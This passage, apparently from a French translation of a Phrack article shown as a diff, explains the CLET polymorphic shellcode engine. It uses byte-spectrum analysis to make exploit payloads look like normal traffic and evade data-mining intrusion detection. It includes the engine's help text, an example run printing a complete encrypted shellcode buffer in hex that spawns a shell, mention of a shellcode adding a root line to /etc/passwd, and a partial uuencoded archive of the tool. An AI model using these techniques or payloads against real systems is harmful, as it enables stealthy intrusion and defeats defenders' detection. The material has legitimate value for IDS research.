+Voyons comment nous pouvons agir sur les différente zones.
+
+
+------[ 5.3.1 Generer des "cramming bytes zone" en utilisant l'analyse
+spectrale
+
+L'idée est ici  simple: on va  générer une cramming bytes zone dont le
+spectre est le meme que le spectre du traffic normal:
+
+-------------------------------------------------------------------------
+| fakenop | decipherroutine | shellcode | bytes to cram | return adress |
+-------------------------------------------------------------------------
+						^
+						|
+						|
+				la probabilitée de ces octets
+				sont dépendants du spectralefile
+				(sans la valeur \x00)
+
+Si il n'y a pas de fichier en argument, il  y une equiprobabilité pour
+toutes les valeurs (sans zero)...  On appliquera ce procédé de génération
+sauf si vous utiliser l'option -B.
+
+Cependant, la  cramming bytes zone est la zone en or. Dans cette optique,
+nous pouvons générer les octets que nous voulons. Rappellons que dans
+plusieurs zones, nous ne pouvons pas utiliser l'analyse spectrale (comme
+dans la routine de déchiffrement  dans notre version).  Il est plus utile
+d'utiliser la cramming bytes zone pour ajouter les octets nous manquant
+dans les zones précédente, dans lesquelles nous ne pouvons pas facilement
+utiliser le fichier spectrale. C'est parti !
+
+
+--------[ 5.3.1.a - un probleme difficile
+
+Pour expliquer cela, nous allons prendre un exemple simple. Nous sommes
+intéressés par une zone ou il y a seulement trois octets acceptés, appellés
+a,b et c. Une étude spectrale de cette zone nous montre:
+
+A: 50
+B: 50
+C: 50
+
+Le probleme est le suivant : a cause de  notre shellcode et de notre
+nop_zone, nos paquets commencent avec la séquence suivante.
+
+ABBAAAAA (8 octets)
+
+Nous pouvons ajouter deux octets avec notre cramming zone. La question est:
+quels deux octets devons nous choisir ?
+
+La réponse est relativement simple. Intuitevement nous pensons a cc,
+pourquoi ?  Parce que c est important dans le traffic et nous n'en
+possédons aucun exemplaire. En fait, si nous appellons
+
+Xa la variable aléatoire de Bernouilli associée au nombre de a dans les 9
+premiers octets.
+Xb la variable aléatoire de Bernouilli associée au nombre de b dans les 9
+premiers octets.
+Xc la variable aléatoire de Bernouilli associée au nombre de c dans les 9
+premiers octets.
+
+Nous comparons intuitivement p(Xa=6)*p(Xb=2)*p(Xc=1) > p(Xa=7)*p(Xb=2)
+			  et p(Xa=6)*p(Xb=2)*p(Xc=1) > p(Xa=6)*p(Xb=3)
+
+Ainsi, nous choisissons c parce que le paquet ABBAAAAAC a spectraleement
+parlant, (NdT: spectrumly speaking), plus de probabilitées d'exister que
+ABBAAAAA ou ABBAAAAAB.
+
+Peut etre pourriez-vous penser que c'est parce que c a la probabilité la
+plus importante dans le traffic. C'est une maniere fausse de voir les
+choses. En effet, imaginez que nous avons le commencement suivant:
+
+CCCCCBBB
+
+Comment devons nous choisir le prochain octet ? Nous souhaitons choisir A
+bien que A et B aient le meme probabilité d'apparaitre (cf les raisons
+expliquées plus haut).
+
+Ok, donc on choisit C. En utilisant le meme principe, nous choisisons
+ensuite C pour les dixième octet: ABBAAAAACC.
+
+Le probleme est que nous ne pouvons utiliser cette méthode pour générer les
+octets de la cramming zone. En effet, cette méthode est fixée. Lorsque que
+nous écrivons fixé, nous voulons dire que les 8 premiers octets fixent les
+deux suivants. C'est une faiblesse !  Ainsi,si nous générons la cramming
+zone par cette méthode, les zones précédentes  (nop_zone + déchiffrement +
+shellcode) vont fixer la cramming zone. Si nous utilisons ce principe, nous
+créons une méthode pour reconnaitre notre paquet. Prennez le début et
+essayez avec le meme principe de créer une cramming zone. Si nous obtenons
+le meme octet, alors le paquet a été crée par le moteur polymorphique CLET
+(même si il n'est pas évident de trouver le début de la cramming bytes
+zone). Nous devons donc écarter cette méthode.
+
+Maintenant nous allons introduire des règles de probabilités. En effet, si
+nous avons le début suivant: ABBAAAAA, nous  devons augmenter la
+probabilité d'obtenir un C et baisser la probabilité d'obtenir B ou A.
+Mais ces dernieres ne doivent pas être nulles ! La vraie question est la
+suivante: comment modifier la probabilité de a,b,c pour obtenir finallement
+un paquet dont le spectre est proche du spectre du traffic ?
+
+------[ 5.3.1.b - une ide'e logique
+
+Prenons le dernier exemple: nous avons
+
+ABBAAAAA
+
+et un fichier spectal avec:
+A=50; B=50; C=100;
+
+Comment choisir les lois de probabilité ?  Avec les notations utilisées
+plus haut et dans le cas ou tous les octets auraient eté choisis en
+utilisant le fichier spectral, nous aurons:
+
+E[Xa]=9/4
+E[Xb]=9/4
+E[Xc]=9/2
+
+E[x] indique la probabilité d'apparition de la variable x (mathématiquement
+parlant dans notre cas: E[x]=p(x)*taille (ici 9) car c'est une variable de
+Bernouilli)
+
+En fait nous avons 6 A et 2 B.  Parce que 9/4-6 <0, il serait stupide de
+générer un B, nous pouvons écrire que la nouvelle probabilité de a est
+maintenant p(A)=0!
+
+Cependant 9/4-2 >0 et 9/2-0>0, ainsi nous pouvons toujours générer b et c
+pour ajuster le spectre. Nous devons avoir p(B)>0 et p(C)>0.  Nous avons:
+
+9/4-2=1/4
+9/2-0=9/2
+
+Ansi, intuitivement, nous pouvons penser logiquement que C a une
+probabilité (9/2)/(1/4)=18 plus importante que la probabilité de B. Ainsi
+nous devons resoudre le systeme:
+
+| p(C)=18*p(C)		cad	| p(B)=1/19
+| p(C)+p(C)=1 			| p(C)=18/19
+
+Et nous obtenons les lois pour générer le neuvieme octet.  Nous pouvons
+ensuite utiliser le meme algorithme pour creer la cramming zone.
+
+Cependant cet algorithme a le probleme suivant:
+
+Le gros probleme est de savoir dans quelles conditions nous avons:
+
+		e[Xa] ~ sizeof(packet) * p(A)
+		e[Xb] ~ sizeof(packet) * p(B)
+		e[Xc] ~ sizeof(packet) * p(C)
+		...
+		lorsque sizeof(cramming zone) ---> +oo
+		cad quand sizeof(paquet) -------> +oo
+
+~ signifiant équivalent à (au sens mathématique du terme).
+
+sizeof(packet) * p(.) sera la probabilité d'apparation de la variable dans
+le paquet dans le cas où le paquet aura été entièrement généré en fonction
+du traffic (parce que dans ce  cas, Xa,Xb,.. sontt des variables de
+Bernouilli, voir [7]). Rappellez vous que c'est ce que nous voulons. Nous
+voulons que notre cramming zone génere un paquet dont le spectre entier est
+proche du spectre du traffic. Nous voulons que nos lois 'corrigent' le
+spectre du début (du paquet).  Intuitivement nous pouvons esperer que ce
+sera le cas parce que nous favorisons l'apparition des octets manquants.
+Cependant il est difficile de le prouver, mathématiquement parlant. Prenons
+E[Xa] par exemple. Il est très difficile de donner son expression.  En
+effet, en utilisant cette méthode, les regles permettant de générer l'octet
+n dependent de l'octet aléatoire n-1. Dans notre exemple, les regles pour
+générer le dixieme octet ne seront pas les memes si nous avons ABBAAAAAC ou
+ABBAAAAAB. Rappellez vous que pour éviter une méthode fixée ,les deux cas
+sont permis !  C'est donc pour toutes ces raisons que nous avons choisi une
+méthode plus simple.
+
+------[ 5.3.1.c La méthode CLET.
+
+Si vous n'utilisez pas l'option -B, la cramming bytes zone sera générée
+comme expliqué au début de la partie 5.3.1, sans tenir compte des zones de
+débuts. Nous pouvons maintentant commencer à expliquer comment cette
+méthode est implémentée, comment elle utilise le fichier spectral. Supposez
+que nous avons le fichier spectral suivant:
+
+0 6
+1 18
+2 13
+3 32
+4 0
+.....
+fc 0
+fd 37
+fe 0
+ff 0
+
+D'abord nous pouvons noter que nous ne nous soucions pas de la premiere
+ligne parce que nous ne pouvons générer de zéros dans notre zone. Nous
+construisons donc le tableau suivant:
+
+   |  sizeof(board) |   1   |   2   |   3   |   FC   |
+---------------------------------------------------------------
+   |   XXXXXXXXX    |  18   | 13+18 | 31+32 |  63+37 |
+                              = 31    = 63    = 100
+
+Ensuite, nous choisissons aléatoirement un nombre n compris entre 1 et 100
+et nous faisons une recherche dichotomique dans le tableau (afin de
+diminuer la complexité de l'alogrithme, nous pouvons réaliser ce type de
+recherche car nous avons un tableau trié).
+
+si 0 < n <= 18 nous générons \x01
+si 18 < n <= 31 nous générons \x02
+si 31 < n <= 63 nous générons \x03
+si 63 < n <= 100 nous générons \xfc
+
+Cette méthode nous permet de générer une cramming bytes zone avec
+p(1)=18/100,p(2)=13/100,p(3)=32/100 et p(fc)=37/100,sans utiliser de
+division de réels.
+
+Maintenant voyons comment l'option -B prend les zones de début  en
+considération.
+
+Nous prenons le meme exemple avec le meme fichier spectral:
+
+   |  sizeof(board) |   1   |   2   |   3   |   FC   |
+---------------------------------------------------------------
+   |   XXXXXXXXX    |  18   | 13+18 | 31+32 |  63+37 |
+                              = 31    = 63    = 100
+
+
+Pour prendre en compte les zones de début, nous modifions le tableau avec
+la méthode suivante:
+
+Imaginez que nous avons à générer  800 octets pour  cramming zone, les
+zones de début ayant une taille globable.  de 200 octets. En fait, à la
+fin, notre paquet sans la zone adresse aura une taille de 1000 octets.
+
+Nous appellons ntotal la valeur maximal dans le tableau (ici 100) et b la
+taille du paquet sans la zone adresse (ici 1000).  b= b1 + b2 (b1 est la
+taille du début=fakenop+déchiffrement+shellcode et b2 est la taille de la
+cramming byte zone). ici b1=200 et b2=800.
+
+Voyons comment nous modifions le tableau, pour l'instant avec l'octet \x03.
+Nous appellons q3 le nombre d'apparition de  l'octet \x03 dans le début.
+(ici nous choisissons q3=20).
+
+Nous calculons q3*ntotal/b=20*1/10=2 et ensuite nous effectuons 63-2=61.
+Nous obtenons le tableau suivant:
+
+
+   |  sizeof(board) |   1   |   2   |   3   |   FC   |
+---------------------------------------------------------------
+   |   XXXXXXXXX    |  18   | 13+18 | 63-02 |  61+37 |
+                              = 31    = 61    = 98
+
+Ainsi, maintenant nous pouvons penser que nous avons une probabilité de
+30/98 de générer \x03.  Cependant cet algorithme doit être utilisé pour
+modifier toutes les valeurs. La valeur 98 sera donc modifée. Nous
+appliquons donc le meme algorithme pour les autres octets et nous pouvons
+supposer que nous obtenons finallement le tableau suivant:
+
+
+   |  sizeof(board) |   1   |   2   |   3   |   FC   |
+---------------------------------------------------------------
+   |   XXXXXXXXX    |  16   | 11+16 |  57   |  57+33 |
+                              = 27             = 90
+
+Finallement nous obtenons les probabilités suivantes :
+
+p(\x01)= 16/90
+p(\x02)= 11/90
+p(\x03)= 30/90
+p(\xfc)= 33/90
+
+Cette règle sera utilisée pour générer toute la cramming bytes zone.
+Intuitivement, nous comprenons qu' avec cette méthode, nous corrigeons
+notre spectre selon les valeurs que nous avons dans le début.  La question
+est maintenant de savoir si nous  pouvons prouver que cette méthode apporte
+une correction correcte, et si
+
+E[Xn] ~ b*p(n) quand b ---> +oo
+
+lorsque X est une variable aléatoire de Bernouilli qui compte le nombre
+d'apparitions de l'octet n dans la paquet et p(n) la probabilité de n
+d'apparaitre dans le traffic.
+
+Dans un tel  cas, cela signifirait que E[X], avec une valeur suffisante de
+b, correspond 'à une simple proportionalité de Bernouilli' : c'est comme si
+nous avions géneré le paquet entier avec les probabilitées du traffic !
+
+Prouvons le !
+
+Nous reprenons les memes notations. ntotal est la somme totale des données
+dans le traffic.  b=b1+b2 (la taille de b1 du début, b2 taille de la
+cramming zone).  Nous appellons q(\xA2) le nombre d'apparition de l'octet
+\xa2 dans le début (fakenop +dechiffrement +shellcode) et n(\xAE) le nombre
+initalement écrit dans le fichier spectral correspond ntà l'octet AE.
+
+Nous prenons un octet que nous appelons TT.
+
+e[Xt] = q(TT) + b2 * p'(TT)
+
+p'(TT) est la probabilité pour avoir n apres la modification du tableau
+spectral.  Comme nous l'avons vu précédemment:
+
+
+                            n(TT) - q(TT)*Ntotal/b         
+p'(TT)=  -----------------------------------------------------------
+          Ntotal - ( q(\x00)+ q(\x01) +  ...... + q(\xFF) )*Ntotal/b
+
+Ainsi nous avons:
+
+                                 n(TT) - q(TT)*Ntotal/b
+E[Xt]=q(TT)+b2*--------------------------------------------------------
+               Ntotal - (q(\x00)+ q(\x01) +  ...... + q(\xFF))*Ntotal/b
+
+Nous simplifions par ntotal:
+
+                          (b2*n(TT))/Ntotal - q(TT)*b2/b
+E[Xt]=q(TT) + --------------------------------------------------------
+                     1 - (q(\x00)+ q(\x01) +  ...... + q(\xFF))/b
+
+ok, quand b -----> +oo, nous avons:
+
+b2~b (b=b1+b2 et b1 est une constante)
+
+Evidemment q(\x00)=o(b); q(\x01)=o(b);.....
+
+Ainsi nous avons 
+	q(\x00)+ q(\x01) +  ...... + q(\xFF))/b = o(1) et:
+   1 - (q(\x00)+ q(\x01) +  ...... + q(\xFF))/b -------> 1
+
+Ainsi E[Xt] = q(TT) + b*(n(TT)/ntotal) - q(TT) + o(b)
+
+Or nous avons p(n)=n(TT)/ntotal donc
+
+e[Xt] = b*p(n) + o(b)
+
+Ainsi e[xt] ~ b*p(n) cool , nous avons réussi!!
+
+Nous pouvons noter que nous avions aussi cette relation avec la premiere
+méthode simple. Nous pouvons ainsi penser que cette seconde méthode n'est
+pas meilleure.  C'est faux : en effet, rappellez vous que cette relation ne
+montre pas qu'une méthode est bonne ou non, elle nous montre juste si la
+méthode est juste ou pas! cette seconde méthode prend en compte le début,
+elle est donc bien mieux que la première. Cependant, avant la
+démonstration, noud ne pouvions savoir si la méthode était juste. Nous
+savions juste que si elle l'était, elle serait meilleur que la premiere
+méthode simpliste. Maintenant nous savons qu'elle est juste. C'est pourquoi
+CLET l'utilise.
+
+
+------[ 5.3.2 - generating shellcode zone using spectrum analysis.
+
+On peut avoir l'idée simple suivante: nous allons générer plusieurs
+routines de déchiffrement et nous allons utiliser la meilleure. Mais
+comment choisir la meilleure ?
+
+Rappellons que nous voulons generer un shellcode qui sera considéré comme
+normal. Ainsi nous pourrions penser que la meilleure routine de
+dechiffrement  est celle qui permet de générer un shellcode dont le spectre
+est proche  du spectre du traffic. Cependant, il est important de
+comprendre que cette approche a ses limites.  En effet, imaginez le cas
+suivant:
+
+Nous avons un ids dont la méthode de data mining est trèss simples, si il
+trouve un octet \xff dans un paquet, il genere une alerte et écarte le
+paquet. Nous avons le fichier spectral suivant:
+
+0 0
+1 0
+.....
+41 15678
+42 23445
+....
+
+Le shellcode que nous générons aura plusieurs \x41 et \x42, mais imaginez
+qu'il y ait un \xff dans le shellcode chiffré. Notre paquet sera ignoré.
+Cependant si nous avions crée un paquet sans avoir utiliser de fichier
+spectral et sans utiliser d'octet \xff, le paquet aurait été  accepté. Pour
+l'instant nous supposons que plus le spectre du paquet est proche de celui
+du traffic et plus sa probabilité de passer est  grande.  Cependant, il
+peut exister des exceptions comme nous le voyons dans cet exemple (nous
+pouvons noter que dans l'exemple la régle était très claire, mais les
+régles générée par une méthode de data mining sont souvent moins simples).
+La  principal question est donc de savoir comment definir un bon shellcode
+polymorphique ?
+
+Contre la méthode de data mining, il y a une idée simple, nous devons
+définir une mesure qui nous permet de mesurer la  valeur d'un shellcode.
+Comment trouver cette mesure ? Pour le moment, nous travaillons sur une
+mesure qui favorise le shellcode dont le spectre est proche de celui du
+traffic en donnant une valeur importantes aux  octets qui n'apparaissent
+pas dans le traffic.  Cependant, cette méthode n'est pas implémentée dans
+la version 1.0.0 car  actuellement les ids utilisant des méthodes de data
+mining ne sont que peu developpés (il n'y a que SNORT) et il est donc assez
+difficile de voir quelles  caractéristiques seront détectées ou non (taille
+du paquet, spectre du paquet, ...) : il est donc assez difficile de definir
+une bonne mesure (qui prend en compte ce genre de paramètres).
+
+
+------[ 5.3.3 - generating fakenop zone using spectrum analysis.
+
+Dans cette partie, nous n'allons pas modifier le code en utilisant
+l'analyse spectrale car une telle implémentation est difficile à mettre en
+place.  Nous allons juste tenter de générer un code aléatoire en utilisant
+une fonction my_random donnant une chance equiprobable de générer un nombre
+entre min et max .... :( Nous avons aussi pensé à une fonction qui
+donnerait un poids pour chaque instruction suivant les résultats d'une
+analyse spectral, et nous aurions alors  pu générer un fake-nop avec une
+fonction aléatoire dont la densité correspond à la densité des
+probabilitées données par l'ancienne fonction...  Le probleme avec cette
+méthode est que l'ensemble des instructions est plus petit que l'ensemble
+de tous les codes hexa quz contient le traffic réseau. Une telle trouvaille
+détourne automatiquement les problèmes de notre méthode, et tout ce que
+nous pouvons faire est de minimaliser la différence entre le spectre de
+notre code et celui d'un traffic réseaux normal, puis essayer de compenser
+avec d'autres parties du shellcode que nous controllons mieux (comme la
+cramming zone)...
+
+----[ 5.4 - conclusion sur les méthodes anti data-mining
+
+L'analyse spectrale est une approche mais ce n'est pas  la seule. Nous
+sommes aussi au courant qu' avec des méthodes comme la méthode neuronale
+exposée plus haut, il est possible de générer un filtre contre les
+shellcodes polymorphiques CLET si vous utilisez notre moteur comme un
+benchmark pour tester  votre systeme neuronal.  C'est une méthodes
+d'utilisation intéréssante ! Peut être serait-il intéréssant de songer à
+utiliser des méthodes génétiques  pour trouver la meilleure approche (cf
+[5]).  Cependant, aujourd'hui le data-mining commence et il est donc
+difficile de trouver la meilleure approche...
+
+--[ 6 - le moteur de shellcode polymorphique CLET
+
+----[ 6.1 - principe
+
+Nous avons décidé de créer aléatoirement  une routine différente a chaque
+fois. Nous générons d'abord un XOR (avec une clé aléatoire) à une place
+aléatoire, et ensuite nous générons des instructions reversibles (autant
+que vous en voulez): add/sub, rol/ror. Nous ne les générons pas en
+assembleur mais dans un language pseudo-assembleur, il est, en effet, plus
+facile de manipuler le language pseudo-assembleur à cet endroit du
+programme car nous avons à réaliser  deux choses en meme temps: chiffrer le
+shellcode et générer la routine déchiffrement.
+
+Voyons comment cela fonctionne:
+
+                        |
+                        |
+                        |
+                +-------+--------+
+                | pseudo-code of |
+                |  the decipher  |<----------------+
+                |    routine     |                 |
+                +----------------+                 |
+                 |              |                  |
+                 |              |                  |
+            traduction    interpretation           |
+                 |              +                  |
+                 |            cipher               |
+                 |              |                  |
+                 |              |                  |
+                 |              |                 YES
+                 |              |                  |
+          +-------------+  +-----------+      +----+----+
+          |   decipher  |  | ciphered  |      |         |
+          |   routine   |  | shellcode +----->| zeroes? |
+          |             |  |           |      |         |
+          +------+------+  +-----------+      +----+----+
+                 |                                 |
+                 |                                NO
+                 |                                 |
+                 |    +----------------------------+
+                 |    |
+                 |    |
+             +-------------+
+             | polymorphed |
+             |  shellcode  |
+             +-------------+
+
+
+Evidement, lorsque qu'une routine de chiffrement a été génerée, nous la
+testons pour voir si un zero apparait dans le code chiffré (nous prenons
+également soin à ne  pas avoir de zéros dans les clés. Si c'est le cas,
+nous les remplacons par un 0x01). Si c'est le cas, une nouvelle routine de
+chiffrement est génerée. Si c'est bon, nous génerons la routine de
+déchiffrement associée. Pour le moment,nous n'inserons pas de fausses
+instructions parmi les bonnes instuctions de la routine de déchiffrement,
+cela pourrait constituer une amélioration pour notre générateur.
+
+L'armature principale de notre routine est relativement toujours la même
+(c'est peut être une faiblesse) car nous utilisons toujours trois
+registres. Toutefois nous prenons soin d'utiliser des  registres différents
+a chaque fois, cad que ces trois registres sont choisis au hasard (cf 4.2).
+
+
+----[ 6.2 - utilisation du moteur polymorphique CLET
+
+theo@warmach$ ./CLET -h
+_________________________________________________________________________
+
+the CLET shellcode mutation engine
+by CLET team:
+theo detristan, tyll ulenspiegel,
+mynheer superbus von underduk, yann malcom
+_________________________________________________________________________
+
+
+don't use it to enter systems, use it to understand systems.
+
+version 1.0.0
+
+syntax :
+./CLET
+-n nnop : generate nnop nop.
+-a : use american english dictonnary to generate nop.
+-c : print c form of the buffer.
+-i nint : decryption routine has nint instructions (default is 5)
+-f file : spectrum file used to polymorph.
+-b ncra : generate ncra cramming bytes using spectrum or not
+-b : cramming bytes zone is adapted to beginning
+-t : number of bytes generated is a multiple of 4
+-x xxxx : xxxx is the address for the address zone
+fe011ec9 for instance
+-z nadd : generate address zone of nadd*4 bytes
+-e : execute shellcode.
+-d : dump shellcode to stdout.
+-s : spectrum analysis.
+-s file : load shellcode from file.
+-e [1-3]: load an embeded shellcode.
+-h : display this message.
+
+/* size options:
+
+in bytes:
+
+-n nnop -b ncra -z nadd/4
+<--------> <--------------><------------->
+-------------------------------------------------------------------------
+| fakenop | decipherroutine | shellcode | bytes to cram | return adress |
+-------------------------------------------------------------------------
+
+-t allows that:
+
+size_of_fake_nop_zone + size_decipher + size_decipher + size_cramming
+is a multiple of 4. this option allows to alignate return adresses.
+
+-i is the number of fake instructions (cf 6.1) in the decipher routine.
+
+/* anti-data mining options:
+
+-f you give here a spectrum file which shows trafic spectrum (cf 5.3)
+if you don't give a file, probabilities of bytes are the same.
+
+-b the option -b generates a cramming bytes zone. if the option is used
+without -b, process of generation doesn't take care of the fakenop
+zone, ciphered shellcode, etc... indeed if -b is used with -b then
+cramming bytes zone tries to correct spectrum 'errors' due to the
+begininning.
+
+/* shellcode
+
+-e allows you to choose one of our shellcode.
+1 is a classic bash (packetstorm).
+2 is aleph one shellcode.
+3 is a w00w00 code which add a root line in /etc/passwd
+(don't use it with -e in root)
+
+-s allows us to give your shellcode. it's important because our
+shellcodes are not remote shellcode! you give a file and its bytes
+will be the shellcode. if you just have a shellcode in cformat you can
+use convert.
+
+-e execute the encrypted shellcode, you see your polymorphic shellcode
+runs.
+
+/* see the generated shellcode.
+
+-c writes the shellcode in c format.
+
+-d dump it on stderr.
+
+
+/* example
+
+theo@warmach$ ./CLET -e -e 2 -b 50 -t -b -c -f ../spectrum/stat2 -a -n 123
+-a -x aabbccee -z 15 -i 8
+
+[+] generating decryption loop :
+add 4ec0cb5c
+ror 19
+sub 466d336c // option -i
+xor a535c6b4 // we've got 8 instructions.
+ror d
+ror 6
+sub 51289e19
+sub dad72129
+done
+
+[+] generating 123 bytes of alpha nop :
+nop : supremelycrutchescataractinstrumentationlovablyperillabarb
+spanishizesbeganambidextrouslyphosphorsavedzealousconvincedfixers
+done
+
+// 123 bytes, it's the -n 123 option. -a means alphanumeric nops.
+
+[+] choosing used regs :
+work_reg : %edx
+left_reg : %ebx // regs randomly chosen for decipher routine.
+addr_reg : %ecx
+done
+
+[+] generating decryption header :
+done
+
+[+] crypting shellcode :
+done
+
+[+] generating 50 cramming bytes // -b 50 bytes of cramming bytes
+[+] using ../spectrum/stat2 // -f ../spectrum/stat2: bytes
+[+] adapting to beginning // depends on spectrum file.
+done // -b options: adapting to beginning
+// cf 5.3.1
+
+[+] generating 1 adding cramming bytes to equalize // -t option
+[+] using ../spectrum/stat2 // we can now add adresses of 4 bytes
+done
+
+[+] assembling buffer :
+buffer length : 348
+done
+
+// this all the polymorph shellcode in c format (option -c)
+
+assembled version :
+\x53\x55\x50\x52
+\x45\x4d\x45\x4c
+\x59\x43\x52\x55
+\x54\x43\x48\x45
+\x53\x43\x41\x54
+\x41\x52\x41\x43
+\x54\x49\x4e\x53
+\x54\x52\x55\x4d
+\x45\x4e\x54\x41
+\x54\x49\x4f\x4e
+\x4c\x4f\x56\x41
+\x42\x4c\x59\x50
+\x45\x52\x49\x4c
+\x4c\x41\x42\x41
+\x52\x42\x53\x50
+\x41\x4e\x49\x53
+\x48\x49\x5a\x45
+\x53\x42\x45\x47
+\x41\x4e\x41\x4d
+\x42\x49\x44\x45
+\x58\x54\x52\x4f
+\x55\x53\x4c\x59
+\x50\x48\x4f\x53
+\x50\x48\x4f\x52
+\x53\x41\x56\x45
+\x44\x5a\x45\x41
+\x4c\x4f\x55\x53
+\x43\x4f\x4e\x56
+\x49\x4e\x43\x45
+\x44\x46\x49\x58
+\x45\x52\x53\xeb
+\x3b\x59\x31\xdb
+\xb3\x30\x8b\x11
+\x81\xc2\x5c\xcb
+\xc0\x4e\xc1\xca
+\x19\x81\xea\x6c
+\x33\x6d\x46\x81
+\xf2\xb4\xc6\x35
+\xa5\xc1\xca\x0d
+\xc1\xca\x06\x81
+\xea\x19\x9e\x28
+\x51\x81\xea\x29
+\x21\xd7\xda\x89
+\x11\x41\x41\x41
+\x41\x80\xeb\x04
+\x74\x07\xeb\xca
+\xe8\xc0\xff\xff
+\xff\xe3\xbf\x84
+\x3e\x59\xf4\xfd
+\xee\xe7\xcf\xe2
+\xa2\x02\xf8\xbe
+\x1d\x30\xeb\x32
+\x3c\x12\xd7\x5a
+\x95\x09\xab\x16
+\x07\x24\xe3\x02
+\xea\x3b\x58\x02
+\x2d\x7a\x82\x8a
+\x1c\x8a\xe1\x5c
+\x23\x4f\xcf\x7c
+\xf5\x41\x41\x43
+\x42\x43\x0a\x43
+\x43\x43\x41\x41
+\x42\x43\x43\x43
+\x43\x43\x43\x42
+\x43\x43\x43\x43
+\x43\x0d\x0d\x43
+\x43\x43\x43\x43
+\x41\x42\x43\x43
+\x43\x41\x43\x42
+\x42\x43\x43\x42
+\x0d\x41\x43\x41
+\x42\x41\x43\x43 // -t option: it is equalized.
+\xaa\xbb\xcc\xee // -z 15 option: 15*sizeof(adress) zone
+\xaa\xbb\xcc\xee // -x aabbccee option gives the adress
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+\xaa\xbb\xcc\xee
+
+executing buffer : ... // -e option we test our polymorph shellcode
+sh-2.05a$ // -e 2 we've chosen aleph one shellcode
+// that's it.
+
+--[ 7 - references.
+
+[1] http://www.phrack.org/p49-14
+smashing the stack for fun and profit, aleph one
+
+[2] http://www.phrack.org/p57-0x0f
+writing ia32 alphanumeric shellcodes, rix
+
+[3] ia-32 intel architecture software developer's manual
+volume 2: instruction set reference
+http://www.intel.com/design/pentium4/manuals/
+obtnez le gratuitement !
+http://www.intel.com/design/pentium4/manuals/index2.htm
+
+[4] billy belcebu virus writing guide
+spe'cialement le chapitre sur le polymorphisme
+http://vx.netlux.org/lib/static/vdat/tumisc60.htm
+
+[5] du virus a l'antivirus, mark ludwig
+spe'cialement le chapitre sur le polymorphisme
+
+[6] neural computing: an introduction.
+r. beale, t. jackson
+
+[7] calcul des probabilites
+dominique foata, aime fuchs
+dunod edition
+
+--[ greetz
+
+nous souhaitons remercier:
+- tous ceux qui étaient aux rtc.party'03, en particulier ptah, eldre8, kad
+  et spacewalker.
+- les mecs de #kaori@irc.freenode.net
+- basque && bedian pour leur support moral.
+
+begin 644 CLET
+m'xl(`'9n.3\``^s];8\t.7:f">is_hh'lvc,#+#=g2g5rpk"?c!w8[a;akf9
+m)tgs"(_=@5!=e:vn6:fjd%75v\)@_oorw/=]#ae9dkh7hu%cl7hr@^<b>?aj
+m=!j-1b-_^;??_^'?_>=o_mw7_^[k?_o[7__jw__9_pg_oo[z)u___*<_;?+k
+...............
+...............
+...............
+ml2ju/[$_y.2do;c)t^7\=m*f)%[za(xt"iwge.g<djo9k^17v@bx.q@)57s'
+m4\:+v2z86i*fluo*/<d_:.$t@:%b]@m)ejpp\t.f$sl`_9i@pchc5\g'g+'<
+m+$].*ny2i2i5j4i5je*5je2e*e6i2e6j4i6j5*4j5:e*5:i2e;[>]&_'0]ph
+$`/@'````
+`
+end
+
+|=[ EOF ]=---------------------------------------------------------------=|
